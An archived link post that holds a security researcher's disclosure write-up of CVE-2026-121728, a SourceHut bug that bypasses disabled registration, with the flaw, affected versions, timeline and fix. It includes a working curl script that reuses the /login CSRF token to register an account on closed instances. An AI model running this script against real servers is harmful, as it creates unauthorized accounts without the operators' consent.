@@ -1,0 +1,91 @@
+---
+post:
+  id: lo-x2hcss
+  source: lobsters
+  title: SourceHut disabled registration bypass | CVE-2026-121728
+  url: https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/
+  hn_url: https://lobste.rs/s/x2hcss
+  score: 18
+  author: mhm
+  posted_at: '2026-11-05T18:34:41Z'
+  fetched_at: '2026-11-06T01:24:31Z'
+  article_url: https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/
+  article_fetch_status: success
+  article_fetched_at: '2026-11-06T01:24:33Z'
+  raw_comment_count: 0
+  tags:
+  - security
+comments: []
+article:
+  url: https://blog.arusekk.pl/posts/srht-disabled-registration-bypass/
+  title: SourceHut disabled registration bypass | CVE-2026-121728 | Arusekk blog
+  fetch_status: success
+  content: "([plaintext version for nerds](https://git.sr.ht/~arusekk/arusekk.srht.site/tree/develop/item/content/posts/srht-disabled-registration-bypass.en.md)
+    - patches welcome)\n\nSo, last time I wrote about [account takeover using XSS
+    on the CI platform of SourceHut](/posts/srht-account-takeover/).\n\nThis time
+    I found something not nearly as ‘impactful’, but still interesting. Sorry for
+    taking this long, but my SSD literally died and while waiting for a warranty repair
+    I had to buy a used one (have you seen the prices yet??). It finally arrived so
+    here I am.\n\nSo, if you want me to work faster, just drop me some money.\n\n##
+    No NLP[#](#no-nlp)\n\nAgain, as you might know, I am not very excited about the
+    current wave of natural language processing.\n\n_No NLP has been used in this
+    research. The mistakes are all mine._\n\n## The background[#](#the-background)\n\nSourceHut
+    has been undergoing quite an architectural change. Its frontend was first built
+    using Flask and Jinja templates and SQLAlchemy. But, for performance reasons,
+    and for other reasons (decoupling of business logic, graphql) the API has been
+    ported over to Go.\n\n## The problem[#](#the-problem)\n\nBack in 2021, while moving
+    registration code from the frontend to the graphql backend, a subtle logic bug
+    got introduced. While the frontend never shows a registration form, and states
+    prominently ‘registration is currently closed’, the form handler is still there.
+    It correctly states that registration is closed on every error path, but on the
+    happy path it does not seem to ever check it. So if you happen to remember how
+    to submit the form…\n\n## The exploitation[#](#the-exploitation)\n\nYou just need
+    to `POST /register/step2` with your desired username, email and password. If the
+    server in question disables registration, but has its SMTP configured properly
+    (you still need to do email confirmation), boom, you are in.\n\nThere is only
+    one caveat, the csrf token — protection against Cross-Site Request Forgery, like
+    a `www.attacker.com` containing `<form action=\"https://meta.sr.ht/profile/delete\">`
+    (or [307ing](307) there), because yes you can post forms to other sites, and yes
+    the request will carry valid cookies. What other sites cannot know are the values
+    of input fields in the form presented to you specifically, so the typical protection
+    is `<input type=\"hidden\" name=\"_csrf_token\" value=\"1d02711ce5a3a17342...\">`.\n\nThere
+    is no registration form displayed, so there is no token. However, fortunately
+    for us attackers, the token from /login works just fine.\n\n## The exploit[#](#the-exploit)\n\n
+    \   #!/bin/sh\n    \n    #META=https://meta.copyleft.market\n    META=http://127.0.0.1:5000\n
+    \   USERNAME=azurediamond\n    EMAIL=test@example.com\n    PASSWORD=hunter2\n
+    \   \n    csrf=$(curl -c cookie.txt $META/login |grep -A1 csrf |cut -d\\' -f2
+    |tail -1)\n    curl -v -b cookie.txt $META/register/step2 \\\n            -d _csrf_token=\"$csrf\"
+    \\\n            -d username=\"$USERNAME\" \\\n            -d email=\"$EMAIL\"
+    \\\n            -d password=\"$PASSWORD\"\n\n## Some metadata, I guess?[#](#some-metadata-i-guess)\n\n-
+    Affected versions: 0.56.11 through 0.88.9\n- Affected instances:[at least 10](https://www.google.com/search?q=%22This+is+the+account%2C+billing%2C+and+security+management+hub%22)(GET
+    WRITTEN PERMISSION BEFORE TESTING)\n- CVSS 4.0 (subjective): [CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/AU:N/R:U/V:D/RE:M/U:Green](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/AU:N/R:U/V:D/RE:M/U:Green)\n-
+    Indicators of compromise: unknown user accounts (go to /users on meta)\n\n## Timeline[#](#timeline)\n\n-
+    2021-09-24 - vulnerability introduced\n- 2026-08-13 - I write ‘registration [on
+    [meta.copyleft.market](https://meta.copyleft.market)] is disabled, so good luck
+    getting anywhere’\n- 2026-09-24 - my SSD dies quite literally as I publish the
+    writeup on the [account takeover vulnerability](/posts/srht-account-takeover/)\n-
+    2026-10-?? - I keep thinking about what I wrote back on 2026-08-13\n- 2026-11-02
+    - disclosure to SourceHut’s security mailing list\n- 2026-11-03 - ack, fix lands,
+    downstream notified, this post published, CVE id requested from VulnCheck\n- 2026-11-03
+    - VulnCheck assigns CVE-2026-121728\n- some day, profit?\n\n## Summary[#](#summary)\n\nLessons
+    learned:\n\n- Refactors can swallow security checks.\n- Double check correctness
+    on auth flows.\n- CSRF protection would prevent this if the token was scope-limited
+    to the specific endpoint each form points to.\n- VulnCheck is nice but their contact
+    channels can still get more responsive.\n\nDoes anyone know a bug bounty program
+    where the researcher pays an upfront participation fee? I will set mine up this
+    way for sure, and you should consider it too, if you are drowning in submissions.\n\nAs
+    I said the last time, I am not done. Stay tuned (follow me on all socials to be
+    sure, and RSS of course) and call hire me maybe.\n\n* * *\n\n1. it’s okay, I did
+    make a backup&nbsp;[↩︎](#fnref:1)\n\n2. please can someone just… stop this madness?
+    who else wants to just cut San Francisco off the Internet? or build a garage DRAM/SSD
+    factory with me? can’t be that hard…&nbsp;[↩︎](#fnref:2)\n\n3. For example by
+    [buying something](https://1clicklinux.org) or [donating](https://github.com/sponsors/Arusekk)
+    or [donating](https://liberapay.com/Arusekk/)(every euro or dollar makes a difference
+    to me). Or by signal boosting my paid projects! You can now hire me for professional
+    consulting, too.&nbsp;[↩︎](#fnref:3)\n\n4. I mean, transformers _are_ groundbreaking,
+    but (not to make this text even longer) in the same sense that leaded fuel was
+    groundbreaking. Cool, but so what. We had fuels before, and we have better fuels
+    now.&nbsp;[↩︎](#fnref:4)"
+  error:
+  fetched_at: '2026-11-06T01:24:33Z'
+archived_at: '2026-11-06T01:24:35Z'
